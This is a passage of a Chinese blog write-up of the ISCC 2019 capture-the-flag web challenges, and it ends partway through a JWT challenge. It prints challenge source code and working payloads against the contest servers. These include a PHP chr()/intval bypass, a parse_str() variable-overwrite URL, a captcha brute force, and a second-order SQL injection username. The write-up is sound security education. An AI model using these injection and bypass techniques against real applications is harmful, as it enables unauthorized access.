@@ -1,0 +1,1210 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=7.1.2">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=7.1.2">
+
+
+  <link rel="mask-icon" href="/images/favicon.ico?v=7.1.2" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.1.2',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="只做了Web题…">
+<meta name="keywords" content="CTF,Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ISCC 2019 Web Writeup">
+<meta property="og:url" content="https://p2hm1n.github.io/2019/06/09/ISCC-2019-Web-Writeup/index.html">
+<meta property="og:site_name" content="ONE PIECE">
+<meta property="og:description" content="只做了Web题…">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://p2hm1n.github.io/2019/06/09/ISCC-2019-Web-Writeup/ISCC-2019-Web-Writeup/1.png">
+<meta property="og:image" content="https://p2hm1n.github.io/2019/06/09/ISCC-2019-Web-Writeup/ISCC-2019-Web-Writeup/2.png">
+<meta property="og:image" content="https://p2hm1n.github.io/2019/06/09/ISCC-2019-Web-Writeup/ISCC-2019-Web-Writeup/3.png">
+<meta property="og:image" content="https://p2hm1n.github.io/2019/06/09/ISCC-2019-Web-Writeup/ISCC-2019-Web-Writeup/4.png">
+<meta property="og:updated_time" content="2019-06-09T13:24:00.658Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ISCC 2019 Web Writeup">
+<meta name="twitter:description" content="只做了Web题…">
+<meta name="twitter:image" content="https://p2hm1n.github.io/2019/06/09/ISCC-2019-Web-Writeup/ISCC-2019-Web-Writeup/1.png">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="https://p2hm1n.github.io/2019/06/09/ISCC-2019-Web-Writeup/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>ISCC 2019 Web Writeup | ONE PIECE</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ONE PIECE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">P2hm1n's blog</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://p2hm1n.github.io/2019/06/09/ISCC-2019-Web-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P2hm1n">
+      <meta itemprop="description" content="ONE PIECE">
+      <meta itemprop="image" content="/images/lufei.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ONE PIECE">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ISCC 2019 Web Writeup
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-06-09 20:53:20 / 修改时间：21:24:00" itemprop="dateCreated datePublished" datetime="2019-06-09T20:53:20+08:00">2019-06-09</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>只做了Web题…</p>
+<a id="more"></a>
+
+<h1 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h1><p><strong>分析源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$value = $_GET[<span class="string">'value'</span>];	<span class="comment">//value是一个数组</span></span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line">$username = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($value); ++$i) &#123;	<span class="comment">//count返回数组中元素的数目</span></span><br><span class="line">    <span class="keyword">if</span> ($value[$i] &gt; <span class="number">32</span> &amp;&amp; $value[$i] &lt; <span class="number">127</span>) </span><br><span class="line">    	<span class="keyword">unset</span>($value);</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    	$username .= chr($value[$i]);	<span class="comment">//chr() 函数从指定的 ASCII 值返回字符，并且加到username上</span></span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="string">'w3lc0me_To_ISCC2019'</span> &amp;&amp; intval($password) &lt; <span class="number">2333</span> &amp;&amp; intval($password + <span class="number">1</span>) &gt; <span class="number">2333</span>) &#123;	<span class="comment">//intval — 获取变量的整数值</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello '</span>.$username.<span class="string">'!'</span>, <span class="string">'&lt;br&gt;'</span>, PHP_EOL;</span><br><span class="line">        <span class="keyword">echo</span> $flag, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+
+<p>理清大概思路时候查看输出 flag 的先决条件是 <code>if ($username == &#39;w3lc0me_To_ISCC2019&#39; &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333)</code></p>
+<ul>
+<li><strong>判断 <code>$username == &#39;w3lc0me_To_ISCC2019&#39;</code></strong> </li>
+</ul>
+<p>跟进 username，变化过程是从第六行的设置为空，到 <code>$username .= chr($value[$i]);</code> 这一步</p>
+<p>value的值在 32到127 之间会被销毁,本想一次性把 w3lc0me_To_ISCC2019 传进去，貌似不行…只能一个一个传。</p>
+<p>写一个小脚本，将其字符串切割。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; <span class="number">119</span> [<span class="number">1</span>] =&gt; <span class="number">51</span> [<span class="number">2</span>] =&gt; <span class="number">108</span> [<span class="number">3</span>] =&gt; <span class="number">99</span> [<span class="number">4</span>] =&gt; <span class="number">48</span> [<span class="number">5</span>] =&gt; <span class="number">109</span> [<span class="number">6</span>] =&gt; <span class="number">101</span> [<span class="number">7</span>] =&gt; <span class="number">95</span> [<span class="number">8</span>] =&gt; <span class="number">84</span> [<span class="number">9</span>] =&gt; <span class="number">111</span> [<span class="number">10</span>] =&gt; <span class="number">95</span> [<span class="number">11</span>] =&gt; <span class="number">73</span> [<span class="number">12</span>] =&gt; <span class="number">83</span> [<span class="number">13</span>] =&gt; <span class="number">67</span> [<span class="number">14</span>] =&gt; <span class="number">67</span> [<span class="number">15</span>] =&gt; <span class="number">50</span> [<span class="number">16</span>] =&gt; <span class="number">48</span> [<span class="number">17</span>] =&gt; <span class="number">49</span> )</span><br></pre></td></tr></table></figure>
+
+<p>发现有不少的在32到127 之间，查看手册发现有这么一句话</p>
+<blockquote>
+<p>Note that if the number is higher than 256, it will return the number mod 256.<br> For example :<br> chr(321)=A because A=65(256)</p>
+</blockquote>
+<p>大概意思是 如果数字高于256，它将返回数字mod 256</p>
+<p>那么改进一下脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; <span class="number">375</span> [<span class="number">1</span>] =&gt; <span class="number">307</span> [<span class="number">2</span>] =&gt; <span class="number">364</span> [<span class="number">3</span>] =&gt; <span class="number">355</span> [<span class="number">4</span>] =&gt; <span class="number">304</span> [<span class="number">5</span>] =&gt; <span class="number">365</span> [<span class="number">6</span>] =&gt; <span class="number">357</span> [<span class="number">7</span>] =&gt; <span class="number">351</span> [<span class="number">8</span>] =&gt; <span class="number">340</span> [<span class="number">9</span>] =&gt; <span class="number">367</span> [<span class="number">10</span>] =&gt; <span class="number">351</span> [<span class="number">11</span>] =&gt; <span class="number">329</span> [<span class="number">12</span>] =&gt; <span class="number">339</span> [<span class="number">13</span>] =&gt; <span class="number">323</span> [<span class="number">14</span>] =&gt; <span class="number">323</span> [<span class="number">15</span>] =&gt; <span class="number">306</span> [<span class="number">16</span>] =&gt; <span class="number">304</span> [<span class="number">17</span>] =&gt; <span class="number">305</span> )</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>然后下一个条件是 <code>intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333)</code></strong></li>
+</ul>
+<p>在 W3C 上有对其函数进行的测试</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>);                      <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">4.2</span>);                     <span class="comment">// 4</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'42'</span>);                    <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'+42'</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'-42'</span>);                   <span class="comment">// -42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">042</span>);                     <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'042'</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">1e10</span>);                    <span class="comment">// 1410065408</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'1e10'</span>);                  <span class="comment">// 1</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">0x1A</span>);                    <span class="comment">// 26</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42000000</span>);                <span class="comment">// 42000000</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">420000000000000000000</span>);   <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'420000000000000000000'</span>); <span class="comment">// 32位系统：2147483647 64位系统：9223372036854775807</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="number">42</span>, <span class="number">8</span>);                   <span class="comment">// 42</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="string">'42'</span>, <span class="number">8</span>);                 <span class="comment">// 34</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>());                 <span class="comment">// 0</span></span><br><span class="line"><span class="keyword">echo</span> intval(<span class="keyword">array</span>(<span class="string">'foo'</span>, <span class="string">'bar'</span>));     <span class="comment">// 1</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>PHP intval() 整型转换函数——返回值：<br> 成功时返回 var 的 integer 值，<br> 失败时返回 0。<br> 空的 array 返回 0，<br>  非空的 array 返回 1。</p>
+</blockquote>
+<p>一开始惊奇的发现可以使用不为空的数组，因为返回的是 1 ，但是不为空的数组似乎并不能和整型的 1 相加， 绕不过第二个条件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (intval($password) &lt; <span class="number">2333</span>)&#123;	</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'successful !'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// successful !</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>but…</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (intval($password + <span class="number">1</span>) &gt; <span class="number">2333</span>)&#123;	</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'successful !'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'false !'</span>;</span><br><span class="line"><span class="comment">//false!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>转换思路…</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"><span class="keyword">if</span> (intval($password) &lt; <span class="number">2333</span> &amp;&amp; intval($password + <span class="number">1</span>) &gt; <span class="number">2333</span>)&#123;	</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'successful !'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'false !'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//传入password=0x91d，successful !</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后构造最终 payload为<br><a href="http://39.100.83.188:8001/?value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=329&amp;value[12]=339&amp;value[13]=323&amp;value[14]=323&amp;value[15]=306&amp;value[16]=304&amp;value[17]=305&amp;value[18]=313&amp;password=0x91d" target="_blank" rel="noopener">http://39.100.83.188:8001/?value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=329&amp;value[12]=339&amp;value[13]=323&amp;value[14]=323&amp;value[15]=306&amp;value[16]=304&amp;value[17]=305&amp;value[18]=313&amp;password=0x91d</a></p>
+<p><br><br></p>
+<h1 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h1><p>破解3位数字密码</p>
+<p>用户名：admin;密码： 三位数;验证码：xxx</p>
+<p>那么密码我们可以用 burpsuite 来暴力破解</p>
+<p>需要下功夫的就是验证码这一块</p>
+<p>看见一篇不错的文章,直接提供了思路： <a href="http://foreversong.cn/archives/889" target="_blank" rel="noopener">http://foreversong.cn/archives/889</a></p>
+<p>经过尝试发现验证码是刷新的，且不可从前端获取到</p>
+<p>尝试设置验证码为空，且删除Cookie</p>
+<p><img src="ISCC-2019-Web-Writeup/1.png" alt></p>
+<p>然后attack</p>
+<p><img src="ISCC-2019-Web-Writeup/2.png" alt></p>
+<p><br><br></p>
+<h1 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h1><p>一道sql-labs二次注入的题</p>
+<p>直接注册：admin’or 1#</p>
+<p>进入界面后，修改admin的密码</p>
+<p>登录admin获取flag</p>
+<p><br><br></p>
+<h1 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h1><p><strong>分析源码</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); <span class="comment">//关闭错误报告</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);    <span class="comment">//包含了flag文件</span></span><br><span class="line">$hashed_key = <span class="string">'ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a'</span>;   <span class="comment">//赋值</span></span><br><span class="line">$parsed = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);   <span class="comment">//请求到的url，经过URL解析函数，返回其组成部分，对其赋值</span></span><br><span class="line"><span class="comment">//query - 在问号 ? 之后</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($parsed[<span class="string">"query"</span>]))&#123;    <span class="comment">//判断是否设置</span></span><br><span class="line">    $query = $parsed[<span class="string">"query"</span>];  <span class="comment">//赋值</span></span><br><span class="line">    $parsed_query = parse_str($query);  <span class="comment">//把查询字符串解析到变量中</span></span><br><span class="line">    <span class="keyword">if</span>($parsed_query!=<span class="keyword">NULL</span>)&#123;    <span class="comment">//不为空的话</span></span><br><span class="line">        $action = $parsed_query[<span class="string">'action'</span>]; <span class="comment">//里面的action对其赋值</span></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($action===<span class="string">"auth"</span>)&#123;   <span class="comment">//判断</span></span><br><span class="line">        $key = $_GET[<span class="string">"key"</span>];    <span class="comment">//GET传参 </span></span><br><span class="line">        $hashed_input = hash(<span class="string">'sha256'</span>, $key); </span><br><span class="line">        <span class="keyword">if</span>($hashed_input!==$hashed_key)&#123;    <span class="comment">//这里要判断两值是否相等</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&lt;img src='cxk.jpg'&gt;"</span>); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> $flag; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>题目很浅显易懂，首先过 <code>if($action===&quot;auth&quot;)</code>的判断条件，直接用 GET 传参就OK了</p>
+<p>但是输出flag的关键点是 <code>if($hashed_input!==$hashed_key)</code> </p>
+<p>跟进一下发现 <code>$hashed_key</code> 在第四行已经赋值</p>
+<p><code>$hashed_input</code> 是通过 GET 传入的参数 key 进过hash计算得到的</p>
+<p>发现直接将其解码肯定解码不出来（貌似是单向加密</p>
+<p>寻找可以利用的点，发现了一个 <code>parse_str()</code> 函数</p>
+<p><strong>Parse_str()函数引起的变量覆盖漏洞</strong></p>
+<blockquote>
+<p>parse_str() 函数用于把查询字符串解析到变量中<br>如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。<br>极度不建议 在没有 array参数的情况下使用此函数<br>并且在 PHP 7.2 中将废弃不设置参数的行为。此函数没有返回值</p>
+</blockquote>
+<p>利用变量覆盖，将其 <code>$hashed_key</code> 的值给覆盖掉</p>
+<p>构造payload：<code>http://39.100.83.188:8066/?action=auth&amp;key=1&amp;hashed_key=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b</code> </p>
+<p><br><br></p>
+<h1 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h1><p>题目确实脑洞：放的tips：看来你并不是Union.373组织成员，请勿入内！</p>
+<p>开始改了Referer，XFF头均无果</p>
+<p>正解：改 user—agent 头，直接在后添加即可</p>
+<p>注入，过滤了圆括号，注释符，from等等</p>
+<p>payload ：order by 排序盲注</p>
+<p>（直接放上官方payload</p>
+<p><img src="ISCC-2019-Web-Writeup/3.png" alt></p>
+<p><br><br></p>
+<h1 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h1><p>常规注册账号，在burpsuite里查看了返回值</p>
+<blockquote>
+<p>JWT<br>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC<br>7519).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
+</blockquote>
+<ul>
+<li>JWT相关资料<ul>
+<li><a href="https://www.jianshu.com/p/576dbf44b2ae" target="_blank" rel="noopener">https://www.jianshu.com/p/576dbf44b2ae</a></li>
+</ul>
+</li>
+</ul>
+<p>注册了账号之后查看返回值</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"result"</span>:<span class="literal">true</span>,<span class="attr">"token"</span>:<span class="string">"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMTIzMzIxMTIiLCJwcml2Ijoib3RoZXIifQ.ppGykY-_rtqX7IbhpIxFiozoBKtDsjbENeidcv3rdQ9WTGTua9gcDJ5O89xuoaS2JD5kz5VfvXU67ZU37x5xNAzCVNgwP3p82oR7KJZFfi_7kdnUMrRAq0JEu2oB0Lmj3Sz8HBe7ToOcnR-NzQo1ds8qrQrT7OhYjFKQXfLuXyU"</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Header</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"alg"</span>: <span class="string">"RS256"</span>,</span><br><span class="line">  <span class="attr">"typ"</span>: <span class="string">"JWT"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Payload</span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"name"</span>: <span class="string">"12332112"</span>,</span><br><span class="line">  <span class="attr">"priv"</span>: <span class="string">"other"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Signature</span><br></pre></td></tr></table></figure>
+
+<p>/static/js/common.js 中有一个这个函数</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getpubkey</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    get the pubkey for test</span></span><br><span class="line"><span class="comment">    /pubkey/&#123;md5(username+password)&#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>拿到pubkey</p>
